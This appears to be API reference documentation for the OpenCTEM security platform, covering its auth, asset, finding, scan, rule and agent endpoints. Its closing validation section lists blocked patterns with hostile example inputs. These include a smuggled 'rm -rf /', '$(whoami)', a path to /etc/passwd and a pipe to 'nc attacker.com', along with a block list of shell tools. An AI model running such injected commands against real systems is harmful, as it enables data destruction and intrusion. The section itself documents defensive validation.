---
layout: default
title: API Reference
parent: Backend Services
nav_order: 2
---

# API Reference

Complete API reference for OpenCTEM CTEM Platform.

**Base URL:** `http://localhost:8080` (development) | `https://api.openctem.io` (production)

---

## Authentication

All protected endpoints require JWT Bearer token:

```
Authorization: Bearer <access_token>
```

### Token Flow

1. **Login** → Returns `refresh_token` + tenant list
2. **Token Exchange** → Exchange `refresh_token` + `tenant_id` → `access_token`
3. **Use Access Token** → Tenant-scoped API calls

---

## Public Endpoints

### Health

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/health` | Health check |
| GET | `/ready` | Readiness check |
| GET | `/metrics` | Prometheus metrics |

### Documentation

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/openapi.yaml` | OpenAPI specification |
| GET | `/docs` | Scalar API documentation UI |

---

## Auth Endpoints

**Prefix:** `/api/v1/auth`

### Local Authentication

| Method | Endpoint | Auth | Description |
|--------|----------|:----:|-------------|
| GET | `/info` | ❌ | Auth provider info |
| POST | `/register` | ❌ | Register new user |
| POST | `/login` | ❌ | Login → refresh_token + tenants |
| POST | `/token` | ❌ | Exchange refresh_token → access_token |
| POST | `/refresh` | ❌ | Refresh tokens with rotation |
| POST | `/logout` | ✅ | Logout (revoke session) |
| POST | `/verify-email` | ❌ | Verify email with token |
| POST | `/forgot-password` | ❌ | Request password reset |
| POST | `/reset-password` | ❌ | Reset password with token |
| POST | `/create-first-team` | ❌* | Create first team for new user |

*Uses refresh_token from cookie

### OAuth Endpoints

| Method | Endpoint | Auth | Description |
|--------|----------|:----:|-------------|
| GET | `/oauth/providers` | ❌ | List available OAuth providers |
| GET | `/oauth/{provider}/authorize` | ❌ | Get OAuth authorization URL |
| POST | `/oauth/{provider}/callback` | ❌ | Handle OAuth callback |

---

## User Endpoints

**Prefix:** `/api/v1/users`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/me` | Authenticated | Get current user profile |
| PUT | `/me` | Authenticated | Update profile |
| PUT | `/me/preferences` | Authenticated | Update preferences |
| GET | `/me/tenants` | Authenticated | List user's teams |
| POST | `/me/change-password` | Authenticated | Change password (local auth) |
| GET | `/me/sessions` | Authenticated | List active sessions |
| DELETE | `/me/sessions` | Authenticated | Revoke all sessions |
| DELETE | `/me/sessions/{sessionId}` | Authenticated | Revoke specific session |

---

## Tenant (Team) Endpoints

**Prefix:** `/api/v1/tenants`

### User-scoped Tenant Operations

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | Authenticated | List user's tenants |
| POST | `/` | Authenticated | Create new tenant |
| GET | `/{tenant}` | Authenticated | Get tenant by ID or slug |

### Tenant-scoped Operations

**Prefix:** `/api/v1/tenants/{tenant}`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/members` | Viewer+ | List members |
| GET | `/members/stats` | Viewer+ | Member statistics |
| GET | `/invitations` | Viewer+ | List pending invitations |
| GET | `/settings` | Viewer+ | Get tenant settings |
| PATCH | `/` | Admin+ | Update tenant |
| POST | `/members` | Admin+ | Add member directly |
| PATCH | `/members/{memberId}` | Admin+ | Update member role |
| DELETE | `/members/{memberId}` | Admin+ | Remove member |
| POST | `/invitations` | Admin+ | Create invitation |
| DELETE | `/invitations/{invitationId}` | Admin+ | Delete invitation |
| PATCH | `/settings/general` | Admin+ | Update general settings |
| PATCH | `/settings/branding` | Admin+ | Update branding |
| PATCH | `/settings/security` | Owner | Update security settings |
| PATCH | `/settings/api` | Owner | Update API settings |
| DELETE | `/` | Owner | Delete tenant |

### Invitation Endpoints

| Method | Endpoint | Auth | Description |
|--------|----------|:----:|-------------|
| GET | `/api/v1/invitations/{token}/preview` | ❌ | Preview invitation |
| POST | `/api/v1/invitations/{token}/decline` | ❌ | Decline invitation |
| GET | `/api/v1/invitations/{token}` | ✅ | Get invitation details |
| POST | `/api/v1/invitations/{token}/accept` | ✅ | Accept invitation |

---

## Asset Endpoints (CTEM Discovery)

**Prefix:** `/api/v1/assets`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `assets:read` | List assets |
| GET | `/stats` | `assets:read` | Asset statistics |
| GET | `/{id}` | `assets:read` | Get asset |
| GET | `/{id}/full` | `assets:read` | Get asset with repository |
| GET | `/{id}/repository` | `assets:read` | Get repository details |
| POST | `/` | `assets:write` | Create asset |
| POST | `/repository` | `assets:write` | Create repository asset |
| PUT | `/{id}` | `assets:write` | Update asset |
| PUT | `/{id}/repository` | `assets:write` | Update repository |
| POST | `/{id}/activate` | `assets:write` | Activate asset |
| POST | `/{id}/deactivate` | `assets:write` | Deactivate asset |
| POST | `/{id}/archive` | `assets:write` | Archive asset |
| POST | `/{id}/sync` | `assets:write` | Sync repository from SCM |
| POST | `/{id}/scan` | `assets:write` | Trigger security scan |
| DELETE | `/{id}` | `assets:delete` | Delete asset |

### Branch Endpoints

**Prefix:** `/api/v1/assets/{assetId}/branches`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `assets:read` | List branches |
| GET | `/default` | `assets:read` | Get default branch |
| GET | `/{branchId}` | `assets:read` | Get branch |
| POST | `/` | `assets:write` | Create branch |
| PUT | `/{branchId}` | `assets:write` | Update branch |
| PUT | `/{branchId}/default` | `assets:write` | Set as default |
| DELETE | `/{branchId}` | `assets:delete` | Delete branch |

---

## Component Endpoints

**Prefix:** `/api/v1/components`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `components:read` | List components |
| GET | `/{id}` | `components:read` | Get component |
| POST | `/` | `components:write` | Create component |
| PUT | `/{id}` | `components:write` | Update component |
| DELETE | `/{id}` | `components:delete` | Delete component |

Asset-scoped:
| GET | `/api/v1/assets/{id}/components` | `components:read` | List asset components |

---

## Vulnerability Endpoints (Global CVE)

**Prefix:** `/api/v1/vulnerabilities`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `vulnerabilities:read` | List vulnerabilities |
| GET | `/{id}` | `vulnerabilities:read` | Get vulnerability |
| GET | `/cve/{cve_id}` | `vulnerabilities:read` | Get by CVE ID |
| POST | `/` | `vulnerabilities:write` | Create vulnerability |
| PUT | `/{id}` | `vulnerabilities:write` | Update vulnerability |
| DELETE | `/{id}` | `vulnerabilities:delete` | Delete vulnerability |

---

## Exposure Event Endpoints (CTEM Discovery)

**Prefix:** `/api/v1/exposures`

Exposure events track non-CVE attack surface changes (port opens, misconfigs, etc.).

### Exposure CRUD

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `findings:read` | List exposure events |
| GET | `/stats` | `findings:read` | Exposure statistics |
| GET | `/{id}` | `findings:read` | Get exposure event |
| POST | `/` | `findings:write` | Create exposure event |
| DELETE | `/{id}` | `findings:delete` | Delete exposure event |

### State Management

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| POST | `/{id}/resolve` | `findings:write` | Mark as resolved |
| POST | `/{id}/accept` | `findings:write` | Accept risk |
| POST | `/{id}/false-positive` | `findings:write` | Mark false positive |
| POST | `/{id}/reactivate` | `findings:write` | Reactivate exposure |
| GET | `/{id}/history` | `findings:read` | State change history |

### Bulk Operations

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| POST | `/ingest` | `findings:write` | Bulk ingest exposures |

---

## Finding Endpoints (CTEM Prioritization)

**Prefix:** `/api/v1/findings`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `findings:read` | List findings |
| GET | `/{id}` | `findings:read` | Get finding |
| POST | `/` | `findings:write` | Create finding |
| PATCH | `/{id}/status` | `findings:write` | Update status |
| DELETE | `/{id}` | `findings:delete` | Delete finding |

### Finding Comments

**Prefix:** `/api/v1/findings/{id}/comments`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `findings:read` | List comments |
| POST | `/` | `findings:write` | Add comment |
| PUT | `/{comment_id}` | `findings:write` | Update comment |
| DELETE | `/{comment_id}` | `findings:write` | Delete comment |

Asset-scoped:
| GET | `/api/v1/assets/{id}/findings` | `findings:read` | List asset findings |

---

## Dashboard Endpoints

**Prefix:** `/api/v1/dashboard`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/stats/global` | `dashboard:read` | Global statistics |
| GET | `/stats` | `dashboard:read` | Tenant statistics |

---

## Audit Log Endpoints

**Prefix:** `/api/v1/audit-logs`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `audit:read` | List audit logs |
| GET | `/stats` | `audit:read` | Audit statistics |
| GET | `/{id}` | `audit:read` | Get audit log |
| GET | `/resource/{type}/{id}` | `audit:read` | Resource history |
| GET | `/user/{id}` | `audit:read` | User activity |

---

## SLA Policy Endpoints

**Prefix:** `/api/v1/sla-policies`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `sla:read` | List SLA policies |
| GET | `/default` | `sla:read` | Get default policy |
| GET | `/{id}` | `sla:read` | Get SLA policy |
| POST | `/` | `sla:write` | Create policy |
| PUT | `/{id}` | `sla:write` | Update policy |
| DELETE | `/{id}` | `sla:delete` | Delete policy |

Asset-scoped:
| GET | `/api/v1/assets/{assetId}/sla-policy` | `assets:read` | Get asset SLA |

---

## SCM Connection Endpoints

**Prefix:** `/api/v1/scm-connections`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `scm-connections:read` | List connections |
| POST | `/` | `scm-connections:write` | Create connection |
| POST | `/test-credentials` | `scm-connections:write` | Test credentials (before create) |
| GET | `/{id}` | `scm-connections:read` | Get connection |
| PUT | `/{id}` | `scm-connections:write` | Update connection |
| DELETE | `/{id}` | `scm-connections:delete` | Delete connection |
| POST | `/{id}/test` | `scm-connections:write` | Test existing connection |
| GET | `/{id}/repositories` | `scm-connections:read` | List repositories from SCM |

---

## Scan Endpoints (CTEM Scanning)

**Prefix:** `/api/v1/scans`

Scan configurations bind asset groups with scanners/workflows and schedules.

### Scan CRUD

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `scans:read` | List scans |
| GET | `/stats` | `scans:read` | Scan statistics |
| GET | `/{id}` | `scans:read` | Get scan |
| POST | `/` | `scans:write` | Create scan |
| PUT | `/{id}` | `scans:write` | Update scan |
| DELETE | `/{id}` | `scans:delete` | Delete scan |

### Scan Status Operations

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| POST | `/{id}/activate` | `scans:write` | Activate scan (enable scheduling) |
| POST | `/{id}/pause` | `scans:write` | Pause scan (suspend scheduling) |
| POST | `/{id}/disable` | `scans:write` | Disable scan |

### Scan Execution

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| POST | `/{id}/trigger` | `scans:write` | Trigger scan execution manually |
| POST | `/{id}/clone` | `scans:write` | Clone scan configuration |

**Rate Limiting:** Trigger endpoints are rate limited per tenant:
- `POST /{id}/trigger`: 20 requests/minute per tenant
- `POST /quick-scan`: 10 requests/minute per tenant (stricter)

### Scan Runs (Sub-resource)

**Prefix:** `/api/v1/scans/{scanId}/runs`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `scans:read` | List runs for scan |
| GET | `/latest` | `scans:read` | Get latest run |
| GET | `/{runId}` | `scans:read` | Get specific run |

---

## Rule Management Endpoints (Custom Rules/Templates)

**Prefix:** `/api/v1/rules`

Rule management allows tenants to add custom rules/templates for security scanning tools (Semgrep, Nuclei, etc.) alongside platform defaults. Rules are stored as YAML files and synced from various sources.

### Rule Sources

Sources are repositories or URLs containing rule definitions. They can be Git repos, HTTP URLs, or local file paths.

**Prefix:** `/api/v1/rules/sources`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `rules:read` | List rule sources |
| GET | `/{sourceId}` | `rules:read` | Get source details |
| POST | `/` | `rules:write` | Create rule source |
| PUT | `/{sourceId}` | `rules:write` | Update rule source |
| DELETE | `/{sourceId}` | `rules:delete` | Delete rule source |
| POST | `/{sourceId}/enable` | `rules:write` | Enable source |
| POST | `/{sourceId}/disable` | `rules:write` | Disable source |
| POST | `/{sourceId}/sync` | `rules:write` | Trigger manual sync |
| GET | `/{sourceId}/sync-history` | `rules:read` | Get sync history |

**Source Types:**
- `git` - Git repository with rules (requires URL, branch, path)
- `http` - HTTP/HTTPS URL to rules archive
- `local` - Local filesystem path (for development)

**Example Create Source Request:**
```json
{
  "name": "Custom Semgrep Rules",
  "description": "Team security rules",
  "tool_id": "550e8400-e29b-41d4-a716-446655440001",
  "source_type": "git",
  "config": {
    "url": "https://github.com/org/security-rules.git",
    "branch": "main",
    "path": "semgrep/",
    "auth_type": "token"
  },
  "credentials_id": "550e8400-e29b-41d4-a716-446655440002",
  "sync_enabled": true,
  "sync_interval_minutes": 60,
  "priority": 100
}
```

### Rules

Individual rule definitions extracted from sources.

**Prefix:** `/api/v1/rules/rules`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `rules:read` | List rules |
| GET | `/{ruleId}` | `rules:read` | Get rule details |

**Query Parameters:**
- `tool_id` - Filter by tool
- `source_id` - Filter by source
- `severity` - Filter by severity (critical, high, medium, low, info)
- `category` - Filter by category
- `search` - Search by rule ID or name

### Rule Overrides

Override rules to enable/disable or change severity for specific contexts.

**Prefix:** `/api/v1/rules/overrides`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `rules:read` | List overrides |
| GET | `/{overrideId}` | `rules:read` | Get override |
| POST | `/` | `rules:write` | Create override |
| PUT | `/{overrideId}` | `rules:write` | Update override |
| DELETE | `/{overrideId}` | `rules:delete` | Delete override |

**Override Types:**
- Pattern-based (`is_pattern: true`) - Glob patterns like `security/*`
- Exact match (`is_pattern: false`) - Specific rule IDs

**Example Create Override Request:**
```json
{
  "tool_id": "550e8400-e29b-41d4-a716-446655440001",
  "rule_pattern": "security/sql-injection-*",
  "is_pattern": true,
  "enabled": false,
  "severity_override": "critical",
  "reason": "Known false positive for our ORM",
  "asset_group_id": "550e8400-e29b-41d4-a716-446655440003",
  "expires_at": "2025-12-31T23:59:59Z"
}
```

### Rule Bundles

Pre-compiled bundles for worker download. Bundles contain merged rules from all enabled sources.

**Prefix:** `/api/v1/rules/bundles`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `rules:read` | List bundles |
| GET | `/latest` | `rules:read` | Get latest bundle for tool |
| GET | `/{bundleId}` | `rules:read` | Get bundle details |
| POST | `/build` | `rules:write` | Trigger bundle build |

**Query Parameters for `/latest`:**
- `tool_id` (required) - Tool ID to get bundle for

**Bundle Response:**
```json
{
  "id": "550e8400-e29b-41d4-a716-446655440004",
  "tenant_id": "550e8400-e29b-41d4-a716-446655440005",
  "tool_id": "550e8400-e29b-41d4-a716-446655440001",
  "version": "v1.2.3",
  "content_hash": "sha256:abc123...",
  "rule_count": 450,
  "source_count": 3,
  "size_bytes": 1024000,
  "storage_path": "bundles/tenant-abc/semgrep-v1.2.3.tar.gz",
  "status": "ready",
  "created_at": "2025-01-19T10:30:00Z"
}
```

---

## Data Ingestion Endpoints

**Prefix:** `/api/v1/ingest`

Endpoints for pushing scan results and findings into OpenCTEM.

### CTIS Format Ingestion

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| POST | `/findings` | `ingest:write` | Push findings in CTIS format |
| POST | `/assets` | `ingest:write` | Push assets in CTIS format |
| POST | `/heartbeat` | `ingest:write` | Send worker heartbeat |

### SARIF Ingestion

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| POST | `/sarif` | `ingest:write` | Push SARIF 2.1.0 results |

**SARIF Request:**
```json
{
  "workspace_id": "550e8400-e29b-41d4-a716-446655440001",
  "sarif": {
    "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
    "version": "2.1.0",
    "runs": [...]
  },
  "options": {
    "auto_resolve_assets": true,
    "dedup_strategy": "fingerprint",
    "asset_type": "repository",
    "asset_value": "github.com/org/repo"
  }
}
```

**Supported SARIF Tools:**
- **SAST:** Semgrep, CodeQL, Bandit, Gosec, ESLint, SonarQube
- **Secrets:** Gitleaks, TruffleHog, Detect-secrets
- **IaC:** Trivy, Checkov, TFSec, Terrascan, KICS
- **Web3:** Slither, Mythril, Securify, Manticore, Aderyn

**SARIF Level Mapping:**
| SARIF Level | OpenCTEM Severity |
|-------------|------------------|
| `error` | `high` |
| `warning` | `medium` |
| `note` | `low` |
| `none` | `info` |

---

## Tool Configuration Endpoints

**Prefix:** `/api/v1/tools`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `tools:read` | List available tools |
| GET | `/{id}` | `tools:read` | Get tool details |
| POST | `/` | `tools:write` | Register tool |
| PUT | `/{id}` | `tools:write` | Update tool |
| DELETE | `/{id}` | `tools:delete` | Delete tool |

---

## Capability Endpoints

Capabilities represent what security tools can do (e.g., `sast`, `sca`, `dast`, `secrets`). Platform capabilities are seeded; tenants can create custom capabilities.

**Prefix:** `/api/v1/capabilities`

### Read Endpoints

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/` | `tools:read` | List capabilities with pagination |
| GET | `/all` | `tools:read` | List all capabilities (no pagination, for dropdowns) |
| GET | `/categories` | `tools:read` | List unique capability categories |
| GET | `/by-category/{category}` | `tools:read` | List capabilities by category |
| GET | `/{id}` | `tools:read` | Get single capability |

### Custom Capability Endpoints

**Prefix:** `/api/v1/custom-capabilities`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| POST | `/` | `tools:write` | Create custom capability for tenant |
| PUT | `/{id}` | `tools:write` | Update custom capability |
| DELETE | `/{id}` | `tools:delete` | Delete custom capability |

### Capability Object

```json
{
  "id": "uuid",
  "tenant_id": "uuid or null",
  "name": "sast",
  "display_name": "Static Analysis",
  "description": "Source code vulnerability detection",
  "icon": "code",
  "color": "purple",
  "category": "security",
  "is_builtin": true,
  "sort_order": 1,
  "created_at": "2026-01-26T00:00:00Z",
  "updated_at": "2026-01-26T00:00:00Z"
}
```

### Seeded Platform Capabilities

| Name | Display Name | Category | Icon | Color |
|------|--------------|----------|------|-------|
| `sast` | Static Analysis | security | code | purple |
| `sca` | Composition Analysis | security | package | blue |
| `dast` | Dynamic Testing | security | zap | orange |
| `secrets` | Secret Detection | security | key | red |
| `iac` | IaC Security | security | server | green |
| `container` | Container Security | security | box | cyan |
| `web` | Web Scanning | security | globe | orange |
| `xss` | XSS Detection | security | alert-triangle | amber |
| `recon` | Reconnaissance | recon | search | yellow |
| `subdomain` | Subdomain Enumeration | recon | layers | lime |
| `http` | HTTP Probing | recon | wifi | teal |
| `portscan` | Port Scanning | recon | radio | indigo |
| `crawler` | Web Crawling | recon | spider | fuchsia |
| `sbom` | SBOM Generation | analysis | file-text | slate |
| `terraform` | Terraform Security | security | cloud | violet |
| `docker` | Docker Security | security | container | sky |

---

## Platform Agent Endpoints

Platform agents are OpenCTEM-managed, shared scanning agents. See [Platform Agents Feature](../features/platform-agents.md) for details.

### Admin Endpoints

**Prefix:** `/api/v1/admin`

#### Platform Agents

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/platform-agents` | Admin | List platform agents |
| GET | `/platform-agents/stats` | Admin | Agent statistics |
| GET | `/platform-agents/{id}` | Admin | Get platform agent |
| POST | `/platform-agents` | Admin | Create platform agent |
| POST | `/platform-agents/{id}/disable` | Admin | Disable agent |
| POST | `/platform-agents/{id}/enable` | Admin | Enable agent |
| DELETE | `/platform-agents/{id}` | Admin | Delete agent |

#### Bootstrap Tokens

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/bootstrap-tokens` | Admin | List bootstrap tokens |
| POST | `/bootstrap-tokens` | Admin | Create bootstrap token |
| POST | `/bootstrap-tokens/{id}/revoke` | Admin | Revoke token |

#### Queue Statistics

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| GET | `/platform-jobs/stats` | Admin | Queue statistics |

### Public Endpoints

| Method | Endpoint | Auth | Description |
|--------|----------|:----:|-------------|
| POST | `/api/v1/platform-agents/register` | ❌ | Agent self-registration (requires bootstrap token) |

### Tenant Endpoints

**Prefix:** `/api/v1/platform-jobs`

| Method | Endpoint | Permission | Description |
|--------|----------|------------|-------------|
| POST | `/` | Authenticated | Submit job to platform queue |
| GET | `/` | Authenticated | List tenant's jobs |
| GET | `/{id}` | Authenticated | Get job status |
| POST | `/{id}/cancel` | Authenticated | Cancel job |

### Platform Agent Endpoints (API Key Auth)

**Prefix:** `/api/v1/platform-agent`

| Method | Endpoint | Auth | Description |
|--------|----------|:----:|-------------|
| POST | `/heartbeat` | API Key* | Record heartbeat |
| POST | `/poll` | API Key* | Long-poll for jobs (up to 30s) |
| POST | `/jobs/{id}/ack` | API Key* + Job Token | Acknowledge job start |
| POST | `/jobs/{id}/progress` | API Key* + Job Token | Report progress |
| POST | `/jobs/{id}/result` | API Key* + Job Token | Submit job result |

*Requires platform agent API key (`X-API-Key` header)

**Job Token:** Jobs return an `auth_token` that must be passed via `X-Job-Token` header for job operations.

**Long-Polling Flow:**
```
1. Agent calls POST /poll with timeout (default 30s)
2. Server checks for available jobs matching agent capabilities
3. If no jobs, server waits (via Redis Pub/Sub) until job available or timeout
4. Returns job(s) when available, empty array on timeout
```

**Example Poll Request:**
```bash
curl -X POST /api/v1/platform-agent/poll \
  -H "X-API-Key: oc_agent_..." \
  -d '{"capabilities": ["nuclei", "trivy"], "timeout": 30}'
```

**Example Job Lifecycle:**
```bash
# 1. Acknowledge job
curl -X POST /api/v1/platform-agent/jobs/{id}/ack \
  -H "X-API-Key: oc_agent_..." \
  -H "X-Job-Token: job-token-here"

# 2. Report progress (optional)
curl -X POST /api/v1/platform-agent/jobs/{id}/progress \
  -H "X-API-Key: oc_agent_..." \
  -H "X-Job-Token: job-token-here" \
  -d '{"progress": 50, "message": "Scanning..."}'

# 3. Submit result
curl -X POST /api/v1/platform-agent/jobs/{id}/result \
  -H "X-API-Key: oc_agent_..." \
  -H "X-Job-Token: job-token-here" \
  -d '{"status": "completed", "result": {...}}'
```

---

## Error Responses

```json
{
  "code": "UNAUTHORIZED",
  "message": "Invalid or expired token",
  "status": 401
}
```

| Status | Code | Description |
|--------|------|-------------|
| 400 | `BAD_REQUEST` | Invalid request body |
| 401 | `UNAUTHORIZED` | Missing or invalid token |
| 403 | `FORBIDDEN` | Insufficient permissions |
| 404 | `NOT_FOUND` | Resource not found |
| 409 | `CONFLICT` | Resource already exists |
| 422 | `VALIDATION_FAILED` | Validation error |
| 429 | `RATE_LIMITED` | Too many requests |
| 429 | `RATE_LIMIT_EXCEEDED` | Auth failure rate limit (IP banned) |
| 500 | `INTERNAL_ERROR` | Server error |

### Platform Agent Specific Errors

| Status | Code | Description |
|--------|------|-------------|
| 400 | `INVALID_SCANNER` | Scanner not in whitelist |
| 400 | `INVALID_JOB_TYPE` | Job type not allowed |
| 400 | `PATH_TRAVERSAL` | Target path contains `../` |
| 400 | `PAYLOAD_TOO_LARGE` | Payload exceeds 1MB limit |
| 401 | `INVALID_JOB_TOKEN` | Job token invalid or expired |
| 403 | `JOB_ACCESS_DENIED` | Agent not authorized for job |
| 429 | `RATE_LIMIT_EXCEEDED` | IP banned due to auth failures |

---

## Rate Limiting

### Trigger Endpoint Rate Limits

To prevent abuse and ensure fair resource usage, trigger endpoints are rate limited per tenant:

| Endpoint | Limit | Window | Scope |
|----------|-------|--------|-------|
| `POST /api/v1/pipelines/{id}/runs` | 30 | 1 minute | Per tenant |
| `POST /api/v1/scans/{id}/trigger` | 20 | 1 minute | Per tenant |
| `POST /api/v1/quick-scan` | 10 | 1 minute | Per tenant (stricter) |

### Rate Limit Headers

All rate-limited endpoints return standard headers:

| Header | Description |
|--------|-------------|
| `X-RateLimit-Limit` | Maximum requests allowed in window |
| `X-RateLimit-Remaining` | Remaining requests in current window |
| `X-RateLimit-Reset` | Unix timestamp when limit resets |
| `Retry-After` | Seconds to wait before retry (when limited) |

### Rate Limit Response

When rate limit is exceeded:

```json
{
  "code": "RATE_LIMIT_EXCEEDED",
  "message": "Rate limit exceeded. Please try again later.",
  "status": 429
}
```

---

## Security Validation

### Input Validation for Pipeline/Scan Operations

All pipeline step configs and scan configs are validated for security before execution.

### Blocked Patterns

The following patterns are blocked in config values:

| Category | Pattern | Example |
|----------|---------|---------|
| Shell metacharacters | `; & \| $ \`` | `target=example.com; rm -rf /` |
| Command substitution | `$(...)` or backticks | `target=$(whoami)` |
| Path traversal | `../` | `file=../../../etc/passwd` |
| Dangerous tools | `curl`, `wget`, `nc`, `bash` | `target=\| nc attacker.com` |

### Blocked Config Keys

The following config keys are not allowed:

```
command, cmd, exec, execute, shell, bash, sh, script,
eval, system, popen, subprocess, spawn, run_command,
os_command, raw_command, custom_command
```

### Tool Validation

- Tool names must exist in the tool registry and be active
- Capabilities must be in the allowed whitelist

### Scan Creation Validation

When creating a scan configuration, the following validations are performed:

| Validation | Type | Error Message |
|------------|------|---------------|
| Tool exists | Single scan | `scanner 'xyz' not found in tool registry` |
| Tool is active | Single scan | `scanner 'xyz' is disabled` |
| Pipeline step tool exists | Workflow scan | `pipeline step 'step_key' uses tool 'xyz' which is not found` |
| Pipeline step tool active | Workflow scan | `pipeline step 'step_key' uses tool 'xyz' which is disabled` |
| Agent availability | All scans | `No agents available. Deploy a tenant agent or upgrade your plan for platform agents.` |

**Agent Availability Check (Trigger Only):**

Agent availability is checked when **triggering** a scan (not during creation):

| Action | Behavior |
|--------|----------|
| Create Scan Config | Warning logged only (allows pre-scheduling) |
| Trigger Scan | Blocks if no daemon agent available |

**Daemon Agent Requirements:**
- `status = 'active'` and `health IN ('online', 'unknown')`
- `execution_mode = 'daemon'` OR `type IN ('worker', 'collector')`
- `current_jobs < max_concurrent_jobs`

Standalone/runner agents (CI/CD) cannot receive server-triggered jobs.

### Target Validation (SSRF Protection)

Custom targets are validated to prevent SSRF attacks:

| Category | Blocked | Example |
|----------|---------|---------|
| Internal IPs | 10.x.x.x, 172.16-31.x.x, 192.168.x.x | `10.0.0.1` |
| Localhost | 127.x.x.x, localhost, ::1 | `http://localhost:8080` |
| Link-local | 169.254.x.x | `169.254.1.1` |
| Dangerous characters | `; & \| $ \`` etc. | `example.com; rm -rf /` |

### Validation Error Response

```json
{
  "code": "SECURITY_VALIDATION_FAILED",
  "message": "Config value contains potentially dangerous pattern: command substitution",
  "status": 400
}
```

```json
{
  "code": "VALIDATION",
  "message": "scanner 'nuclei-invalid' not found in tool registry",
  "status": 400
}
```
